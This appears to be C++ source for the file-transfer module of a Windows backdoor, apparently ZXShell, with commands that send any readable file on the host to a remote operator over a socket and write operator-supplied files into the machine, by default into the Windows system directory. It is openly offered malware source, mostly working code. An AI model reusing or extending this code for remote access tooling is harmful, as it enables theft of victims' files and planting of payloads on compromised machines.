//�ļ�����

extern int DataSend(SOCKET s, char *DataBuf, int DataLen);//define in zxportmap.cpp
extern BOOL WriteToFile(HANDLE hFile, char *Buff, int Datalen); //define in WGet.cpp
__int64 Transmitfile(SOCKET sd, HANDLE hFile, __int64 size);
extern int SetTimeOut(SOCKET Socket,int nTimeOut); //define in common.cpp


BOOL IsReadability(char *LocalFile, __int64 *lpFileSize)
{
	BOOL fSuccess = FALSE;
	LARGE_INTEGER LI;
	HANDLE hFile = ZXSAPI::CreateFile(LocalFile, 
        GENERIC_READ, 
        FILE_SHARE_READ, 
        NULL, 
        OPEN_EXISTING, 
        FILE_ATTRIBUTE_NORMAL, 
        NULL);
	if(hFile == INVALID_HANDLE_VALUE){
		return FALSE;
	}
	if(GetFileSizeEx(hFile, &LI))
	{
		*lpFileSize = LI.QuadPart;
		fSuccess = TRUE;
	}

	CloseHandle(hFile);
	return fSuccess;
}
int SendFileData(SOCKET Socket, char *LocalFile, __int64 StartPos)
{
	__int64 ret = -1;
	LARGE_INTEGER LI, Len;

	HANDLE hFile = ZXSAPI::CreateFile(LocalFile, 
        GENERIC_READ, 
        FILE_SHARE_READ, 
        NULL, 
        OPEN_EXISTING, 
        FILE_ATTRIBUTE_NORMAL, 
        NULL);
	if(hFile == INVALID_HANDLE_VALUE){
		return ret;
	}

	if(!GetFileSizeEx(hFile, &LI))
		goto error;

	Len.QuadPart = StartPos;
	if(!SetFilePointerEx(hFile, Len, NULL, FILE_BEGIN))
		goto error;
	LI.QuadPart -= StartPos;
	ret = Transmitfile(Socket, hFile, LI.QuadPart);
	if(ret != LI.QuadPart)
		ret = -1;

error:
	CloseHandle(hFile);
	return ret;
}

__int64 Transmitfile(SOCKET sd, HANDLE hFile, __int64 size)
{
    DWORD len, nBytes, ret = 0;
    __int64 tatolsize = size, len_sent = 0;
	char buf[MAXBUFSIZE];

    while(len_sent < size)
    {
		if(tatolsize < (__int64)MAXBUFSIZE)
			nBytes = tatolsize;
		else
			nBytes = MAXBUFSIZE;
		if(!ZXSAPI::ReadFile(hFile, buf, nBytes, &len, NULL))
			return len_sent;
		if(len == 0)
			break;
		ret = DataSend(sd, buf, len);
        if(ret != len || ret == 0)
        {
            return 0;
        }
        len_sent += len;
		tatolsize -= len;
    }

	return len_sent;
}

int DownloadFile(MainPara *args)
{
	SOCKET Socket = args->Socket;

	ARGWTOARGVA arg(args->lpCmd);
	int argc = arg.GetArgc();
	char **argv = arg.GetArgv();

	char *Usage = ""
		"Usage:\r\n"
		"    Dnload remotefile localfile\r\n";//Dnload FileName
	if(argc < 3)
		return SendMessage(Socket, Usage);

	__int64 ret, filesize;
	DWORD dwStartTime = GetTickCount();

	if(! IsReadability(argv[1], &filesize))
	{
		SendMessage(Socket, "Send File Error. File has not readability\r\n");
		return 0;
	}
	Send_ACK(Socket, 0xF4);
	if(!Recv_ACK(Socket, 0xF4))
	{
		SendMessage(Socket, "Receive Transfer ACK Error.\r\n");
		return 0;
	}
	SendMessage(Socket, "Dnload %I64d\r\n", filesize);
	if((ret = SendFileData(Socket, argv[1], 0)) == -1)
		SendMessage(Socket, "Send File Error.\r\n");
	else
		SendMessage(Socket, "\nTransfer successful: %I64d bytes in %d milliseconds.\r\n", ret, GetTickCount()-dwStartTime);

	return 0;   // The Program Quit
}

/////////////////////////////////////////
/////////////////////////////////////////
BOOL IsWritable(char *LocalFile)
{
	HANDLE hFile = ZXSAPI::CreateFile(LocalFile, 
        GENERIC_WRITE, 
        FILE_SHARE_WRITE, 
        NULL, 
        OPEN_ALWAYS, 
        FILE_ATTRIBUTE_NORMAL, 
        NULL);
	if(hFile == INVALID_HANDLE_VALUE){
		return FALSE;
	}

	CloseHandle(hFile);
	return TRUE;
}

BOOL RecvFileData(SOCKET Socket, char *LocalFile, __int64 FileSize)
{
	int nRetVal, nBytes, fSuccess = TRUE;
	char RecvBuf[MAXBUFSIZE];
	__int64 TotalBytesRecv = 0;
	BOOL bError;
	LARGE_INTEGER LI;

	SetFileAttributes(LocalFile, FILE_ATTRIBUTE_NORMAL);

	HANDLE hFile = ZXSAPI::CreateFile(LocalFile, 
        GENERIC_READ|GENERIC_WRITE, 
        FILE_SHARE_READ|FILE_SHARE_WRITE, 
        NULL, 
        OPEN_ALWAYS, 
        FILE_ATTRIBUTE_NORMAL, 
        NULL);
	if(hFile == INVALID_HANDLE_VALUE){
		return FALSE;
	}
	if(!GetFileSizeEx(hFile, &LI)){
		return FALSE;
	}
	if(!SetFilePointerEx(hFile, LI, NULL, FILE_BEGIN))
		return FALSE;

	while(TotalBytesRecv < FileSize)
	{
		if(FileSize - TotalBytesRecv < (__int64)MAXBUFSIZE)
			nBytes = FileSize - TotalBytesRecv;
		else
			nBytes = MAXBUFSIZE;

		if(SetTimeOut(Socket, 20) <= 0)
		{
			fSuccess = FALSE;
			break;
		}
		nRetVal = recv(Socket, RecvBuf, nBytes, 0);
		if(nRetVal <= 0)
		{
			fSuccess = FALSE;
			break;
		}
		else
		{
			if(!WriteToFile(hFile, RecvBuf, nRetVal))
			{
				fSuccess = FALSE;
				break;
			}
			TotalBytesRecv += nRetVal;
		}
	}
	SetEndOfFile(hFile);
exit:

    CloseHandle(hFile);
	return fSuccess;
}

int UploadFile(MainPara *args)
{
	SOCKET Socket = args->Socket;

	ARGWTOARGVA arg(args->lpCmd);
	int argc = arg.GetArgc();
	char **argv = arg.GetArgv();

	char *Usage = ""
		"Usage:\r\n"
		"    Upload localfile remotefile\r\n";//"    Upload FileName FileSize\r\n";
	if(argc < 3)
		return SendMessage(Socket, Usage);

	char LocalFile[MAX_PATH];
	DWORD dwStartTime = GetTickCount();

	if(argv[1][1] == ':')
	{
		_snprintf(LocalFile, MAX_PATH, "%s", argv[1]);
	}else
	{
		GetSystemDirectory(LocalFile, MAX_PATH);
		sprintf(LocalFile, "%s\\%s", LocalFile, argv[1]);
	}
	if(!IsWritable(LocalFile))
	{
		SendMessage(Socket, "Can not create file.\r\n");
		return 0;
	}
	Send_ACK(Socket, 0xF4);
	if(!Recv_ACK(Socket, 0xF4))
	{
		SendMessage(Socket, "Receive Transfer ACK Error.\r\n");
		return 0;
	}
	if(!RecvFileData(Socket, LocalFile, _atoi64(argv[2])))
		SendMessage(Socket, "Receive File Error.\r\n");
	else
		SendMessage(Socket, "\nTransfer successful. used %d milliseconds.\r\n", GetTickCount()-dwStartTime);

	return 0;
}

